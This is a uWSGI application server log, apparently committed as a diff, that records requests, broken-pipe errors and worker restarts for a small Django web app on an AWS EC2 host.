+Thu Jun  3 14:51:58 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (1.217.129.235)
+OSError: write error
+[pid: 3484|app: 0|req: 18/35] 1.217.129.235 () {44 vars in 903 bytes} [Thu Jun  3 14:51:58 2021] GET / => generated 0 bytes in 145 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+[pid: 3484|app: 0|req: 19/36] 1.217.129.235 () {44 vars in 903 bytes} [Thu Jun  3 14:51:58 2021] GET / => generated 10457 bytes in 123 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+Thu Jun  3 14:51:58 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 1.217.129.235) !!!
+Thu Jun  3 14:51:58 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (1.217.129.235)
+OSError: write error
+[pid: 3482|app: 0|req: 1/37] 1.217.129.235 () {44 vars in 902 bytes} [Thu Jun  3 14:51:58 2021] GET / => generated 0 bytes in 329 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+[pid: 3484|app: 0|req: 20/38] 1.217.129.235 () {44 vars in 903 bytes} [Thu Jun  3 14:51:58 2021] GET / => generated 10457 bytes in 129 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3483|app: 0|req: 17/39] 1.217.129.235 () {44 vars in 903 bytes} [Thu Jun  3 14:51:58 2021] GET / => generated 10457 bytes in 114 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 21/40] 1.217.129.235 () {44 vars in 903 bytes} [Thu Jun  3 14:51:58 2021] GET / => generated 10457 bytes in 128 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 22/41] 1.217.129.235 () {44 vars in 902 bytes} [Thu Jun  3 14:53:24 2021] GET / => generated 10457 bytes in 160 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3483|app: 0|req: 18/42] 1.217.129.235 () {44 vars in 902 bytes} [Thu Jun  3 14:53:25 2021] GET / => generated 10457 bytes in 155 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+Thu Jun  3 14:53:26 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 1.217.129.235) !!!
+Thu Jun  3 14:53:26 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (1.217.129.235)
+OSError: write error
+[pid: 3484|app: 0|req: 23/43] 1.217.129.235 () {44 vars in 902 bytes} [Thu Jun  3 14:53:26 2021] GET / => generated 0 bytes in 129 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+[pid: 3483|app: 0|req: 19/44] 1.217.129.235 () {44 vars in 903 bytes} [Thu Jun  3 14:53:26 2021] GET / => generated 10457 bytes in 116 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+Thu Jun  3 14:53:26 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 1.217.129.235) !!!
+Thu Jun  3 14:53:26 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (1.217.129.235)
+OSError: write error
+[pid: 3484|app: 0|req: 24/45] 1.217.129.235 () {44 vars in 903 bytes} [Thu Jun  3 14:53:26 2021] GET / => generated 0 bytes in 138 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+[pid: 3483|app: 0|req: 20/46] 1.217.129.235 () {44 vars in 902 bytes} [Thu Jun  3 14:53:26 2021] GET / => generated 10457 bytes in 133 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 25/47] 1.217.129.235 () {44 vars in 902 bytes} [Thu Jun  3 14:53:26 2021] GET / => generated 10457 bytes in 122 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3483|app: 0|req: 21/48] 1.217.129.235 () {44 vars in 1068 bytes} [Thu Jun  3 14:53:47 2021] GET /admin/category/performance/%EC%98%A4%EC%A1%B4%EC%B8%B5%20%EB%AA%A8%EC%9E%84/change/ => generated 10544 bytes in 180 msecs (HTTP/1.1 200) 9 headers in 462 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 26/49] 1.217.129.235 () {42 vars in 849 bytes} [Thu Jun  3 14:53:47 2021] GET /admin/jsi18n/ => generated 8330 bytes in 112 msecs (HTTP/1.1 200) 6 headers in 189 bytes (1 switches on core 0)
+[pid: 3483|app: 0|req: 22/50] 1.217.129.235 () {44 vars in 1068 bytes} [Thu Jun  3 14:53:50 2021] GET /admin/category/performance/%EC%98%A4%EC%A1%B4%EC%B8%B5%20%EB%AA%A8%EC%9E%84/change/ => generated 10544 bytes in 145 msecs (HTTP/1.1 200) 9 headers in 462 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 27/51] 1.217.129.235 () {42 vars in 871 bytes} [Thu Jun  3 14:59:23 2021] GET / => generated 10457 bytes in 155 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3483|app: 0|req: 23/52] 1.217.129.235 () {44 vars in 1003 bytes} [Thu Jun  3 14:59:25 2021] GET /category/detail/%EC%98%A4%EC%A1%B4%EC%B8%B5%20%EB%AA%A8%EC%9E%84 => generated 4950 bytes in 154 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 28/53] 1.217.129.235 () {44 vars in 993 bytes} [Thu Jun  3 15:01:35 2021] GET /category/detail/Turn%20on%20that%20Blue%20Vinyl => generated 4914 bytes in 173 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3483|app: 0|req: 24/54] 1.217.129.235 () {44 vars in 1019 bytes} [Thu Jun  3 15:01:37 2021] GET /category/detail/%EB%B0%95%ED%9A%A8%EC%8B%A0,%20Soul%20Tree,%20Lovers => generated 4956 bytes in 134 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 29/55] 1.217.129.235 () {44 vars in 1003 bytes} [Thu Jun  3 15:01:39 2021] GET /category/detail/%EC%98%A4%EC%A1%B4%EC%B8%B5%20%EB%AA%A8%EC%9E%84 => generated 4950 bytes in 126 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3483|app: 0|req: 25/56] 1.217.129.235 () {44 vars in 993 bytes} [Thu Jun  3 15:01:42 2021] GET /users/login => generated 2178 bytes in 154 msecs (HTTP/1.1 200) 7 headers in 349 bytes (1 switches on core 0)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 5 buried after 1 seconds
+worker 6 buried after 1 seconds
+worker 7 buried after 2 seconds
+worker 8 buried after 2 seconds
+worker 9 buried after 2 seconds
+worker 10 buried after 2 seconds
+binary reloading uWSGI...
+chdir() to /home/ec2-user
+closing all non-uwsgi socket fds > 2 (max_fd = 65535)...
+found fd 3 mapped to socket 0 (/home/ec2-user/AWS_Web/myticket.sock)
+running /home/ec2-user/venv_AWS_Web/bin/uwsgi
+[uWSGI] getting INI configuration from AWS_Web/myticket_uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Thu Jun  3 15:01:47 2021] ***
+compiled with version: 7.3.1 20180712 (Red Hat 7.3.1-12) on 30 May 2021 06:08:58
+os: Linux-4.14.232-176.381.amzn2.x86_64 #1 SMP Wed May 19 00:31:54 UTC 2021
+nodename: was1
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/ec2-user
+detected binary path: /home/ec2-user/venv_AWS_Web/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/ec2-user/AWS_Web
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /home/ec2-user/AWS_Web/myticket.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.9 (default, Apr 30 2021, 20:11:56)  [GCC 7.3.1 20180712 (Red Hat 7.3.1-12)]
+PEP 405 virtualenv detected: /home/ec2-user/venv_AWS_Web
+Set PythonHome to /home/ec2-user/venv_AWS_Web
+Python main interpreter initialized at 0xcf5520
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 802120 bytes (783 KB) for 10 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xcf5520 pid: 3472 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+gracefully (RE)spawned uWSGI master process (pid: 3472)
+spawned uWSGI worker 1 (pid: 3596, cores: 1)
+spawned uWSGI worker 2 (pid: 3597, cores: 1)
+spawned uWSGI worker 3 (pid: 3598, cores: 1)
+spawned uWSGI worker 4 (pid: 3599, cores: 1)
+spawned uWSGI worker 5 (pid: 3600, cores: 1)
+spawned uWSGI worker 6 (pid: 3601, cores: 1)
+spawned uWSGI worker 7 (pid: 3602, cores: 1)
+spawned uWSGI worker 8 (pid: 3603, cores: 1)
+spawned uWSGI worker 9 (pid: 3604, cores: 1)
+spawned uWSGI worker 10 (pid: 3605, cores: 1)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Sat Jun  5 10:24:13 2021] ***
+compiled with version: 7.3.1 20180712 (Red Hat 7.3.1-12) on 30 May 2021 06:08:58
+os: Linux-4.14.232-176.381.amzn2.x86_64 #1 SMP Wed May 19 00:31:54 UTC 2021
+nodename: was1
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/ec2-user
+detected binary path: /home/ec2-user/venv_AWS_Web/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/ec2-user/AWS_Web
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /home/ec2-user/AWS_Web/myticket.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.9 (default, Apr 30 2021, 20:11:56)  [GCC 7.3.1 20180712 (Red Hat 7.3.1-12)]
+PEP 405 virtualenv detected: /home/ec2-user/venv_AWS_Web
+Set PythonHome to /home/ec2-user/venv_AWS_Web
+Python main interpreter initialized at 0xf38330
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 802120 bytes (783 KB) for 10 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 5 seconds on interpreter 0xf38330 pid: 2861 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+spawned uWSGI master process (pid: 2861)
+spawned uWSGI worker 1 (pid: 3095, cores: 1)
+spawned uWSGI worker 2 (pid: 3096, cores: 1)
+spawned uWSGI worker 3 (pid: 3097, cores: 1)
+spawned uWSGI worker 4 (pid: 3098, cores: 1)
+spawned uWSGI worker 5 (pid: 3099, cores: 1)
+spawned uWSGI worker 6 (pid: 3100, cores: 1)
+spawned uWSGI worker 7 (pid: 3101, cores: 1)
+spawned uWSGI worker 8 (pid: 3102, cores: 1)
+spawned uWSGI worker 9 (pid: 3103, cores: 1)
+spawned uWSGI worker 10 (pid: 3104, cores: 1)
+Sat Jun  5 19:32:13 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.1.67) !!!
+Sat Jun  5 19:32:13 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.1.67)
+OSError: write error
+[pid: 3099|app: 0|req: 1/1] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:27:20 2021] GET / => generated 0 bytes in 293231 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:13 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.1.67) !!!
+Sat Jun  5 19:32:13 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.1.67)
+OSError: write error
+[pid: 3099|app: 0|req: 2/2] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:32:13 2021] GET / => generated 0 bytes in 79 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:13 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.0.90) !!!
+Sat Jun  5 19:32:13 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.0.90)
+OSError: write error
+[pid: 3099|app: 0|req: 3/3] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:32:13 2021] GET / => generated 0 bytes in 70 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:13 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.1.67) !!!
+Sat Jun  5 19:32:13 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.1.67)
+OSError: write error
+[pid: 3099|app: 0|req: 4/4] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:32:13 2021] GET / => generated 0 bytes in 68 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:13 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.0.90) !!!
+Sat Jun  5 19:32:13 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.0.90)
+OSError: write error
+[pid: 3099|app: 0|req: 5/5] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:32:13 2021] GET / => generated 0 bytes in 70 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:13 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.1.67) !!!
+Sat Jun  5 19:32:13 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.1.67)
+OSError: write error
+[pid: 3099|app: 0|req: 6/6] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:32:13 2021] GET / => generated 0 bytes in 70 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:13 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.0.90) !!!
+Sat Jun  5 19:32:13 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.0.90)
+OSError: write error
+[pid: 3099|app: 0|req: 7/7] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:32:13 2021] GET / => generated 0 bytes in 78 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:14 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.1.67) !!!
+Sat Jun  5 19:32:14 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.1.67)
+OSError: write error
+[pid: 3099|app: 0|req: 8/8] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:32:13 2021] GET / => generated 0 bytes in 83 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:14 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.0.90) !!!
+Sat Jun  5 19:32:14 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.0.90)
+OSError: write error
+[pid: 3099|app: 0|req: 9/9] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:32:14 2021] GET / => generated 0 bytes in 87 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:14 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.0.90) !!!
+Sat Jun  5 19:32:14 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.0.90)
+OSError: write error
+[pid: 3099|app: 0|req: 10/10] 10.0.0.90 () {46 vars in 927 bytes} [Sat Jun  5 19:32:14 2021] GET / => generated 0 bytes in 80 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:14 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.1.67) !!!
+Sat Jun  5 19:32:14 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.1.67)
+OSError: write error
+[pid: 3099|app: 0|req: 11/11] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:32:14 2021] GET / => generated 0 bytes in 71 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:14 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.0.90) !!!
+Sat Jun  5 19:32:14 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.0.90)
+OSError: write error
+[pid: 3099|app: 0|req: 12/12] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:32:14 2021] GET / => generated 0 bytes in 78 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:14 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.1.67) !!!
+Sat Jun  5 19:32:14 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.1.67)
+OSError: write error
+[pid: 3099|app: 0|req: 13/13] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:32:14 2021] GET / => generated 0 bytes in 67 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:14 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.0.90) !!!
+Sat Jun  5 19:32:14 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.0.90)
+OSError: write error
+[pid: 3099|app: 0|req: 14/14] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:32:14 2021] GET / => generated 0 bytes in 76 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:14 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.1.67) !!!
+Sat Jun  5 19:32:14 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.1.67)
+OSError: write error
+[pid: 3099|app: 0|req: 15/15] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:32:14 2021] GET / => generated 0 bytes in 83 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:14 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.0.90) !!!
+Sat Jun  5 19:32:14 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.0.90)
+OSError: write error
+[pid: 3099|app: 0|req: 16/16] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:32:14 2021] GET / => generated 0 bytes in 81 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:14 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.1.67) !!!
+Sat Jun  5 19:32:14 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.1.67)
+OSError: write error
+[pid: 3099|app: 0|req: 17/17] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:32:14 2021] GET / => generated 0 bytes in 78 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:14 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.0.90) !!!
+Sat Jun  5 19:32:14 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.0.90)
+OSError: write error
+[pid: 3099|app: 0|req: 18/18] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:32:14 2021] GET / => generated 0 bytes in 71 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:17 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.0.90) !!!
+Sat Jun  5 19:32:17 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.0.90)
+OSError: write error
+[pid: 3103|app: 0|req: 1/19] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:26:00 2021] GET / => generated 0 bytes in 377683 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:18 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.0.90) !!!
+Sat Jun  5 19:32:18 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.0.90)
+OSError: write error
+[pid: 3100|app: 0|req: 1/20] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:27:00 2021] GET / => generated 0 bytes in 318160 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:19 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.0.90) !!!
+Sat Jun  5 19:32:19 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.0.90)
+OSError: write error
+[pid: 3095|app: 0|req: 1/21] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:26:30 2021] GET / => generated 0 bytes in 349487 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+[pid: 3103|app: 0|req: 2/22] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:32:20 2021] GET / => generated 10457 bytes in 85 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+Sat Jun  5 19:32:21 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.0.90) !!!
+Sat Jun  5 19:32:21 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.0.90)
+OSError: write error
+[pid: 3096|app: 0|req: 1/23] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:27:30 2021] GET / => generated 0 bytes in 291383 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:25 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.1.67) !!!
+Sat Jun  5 19:32:25 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.1.67)
+OSError: write error
+[pid: 3098|app: 0|req: 1/24] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:27:50 2021] GET / => generated 0 bytes in 275359 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:26 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.1.67) !!!
+Sat Jun  5 19:32:26 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.1.67)
+OSError: write error
+[pid: 3101|app: 0|req: 1/25] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:26:20 2021] GET / => generated 0 bytes in 365816 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+[pid: 3103|app: 0|req: 3/26] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:32:30 2021] GET / => generated 10457 bytes in 97 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3101|app: 0|req: 2/27] 10.0.0.90 () {48 vars in 958 bytes} [Sat Jun  5 19:32:30 2021] GET / => generated 10457 bytes in 75 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+Sat Jun  5 19:32:40 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.0.90) !!!
+Sat Jun  5 19:32:40 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.0.90)
+OSError: write error
+Sat Jun  5 19:32:40 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.0.90) !!!
+Sat Jun  5 19:32:40 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.0.90)
+OSError: write error
+[pid: 3097|app: 0|req: 1/28] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:28:00 2021] GET / => generated 0 bytes in 280036 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+[pid: 3104|app: 0|req: 1/29] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:25:29 2021] GET / => generated 0 bytes in 430143 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+Sat Jun  5 19:32:42 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 10.0.1.67) !!!
+Sat Jun  5 19:32:42 2021 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (10.0.1.67)
+OSError: write error
+[pid: 3102|app: 0|req: 1/30] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:26:50 2021] GET / => generated 0 bytes in 351805 msecs (HTTP/1.1 200) 6 headers in 0 bytes (0 switches on core 0)
+[pid: 3104|app: 0|req: 2/31] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:32:50 2021] GET / => generated 10457 bytes in 76 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 4/32] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:33:00 2021] GET / => generated 10457 bytes in 116 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 3/33] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:33:20 2021] GET / => generated 10457 bytes in 76 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 4/34] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:33:30 2021] GET / => generated 10457 bytes in 84 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 5/35] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:33:50 2021] GET / => generated 10457 bytes in 74 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 5/36] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:34:00 2021] GET / => generated 10457 bytes in 125 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 6/37] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:34:20 2021] GET / => generated 10457 bytes in 99 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 7/38] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:34:30 2021] GET / => generated 10457 bytes in 85 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 8/39] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:34:50 2021] GET / => generated 10457 bytes in 74 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
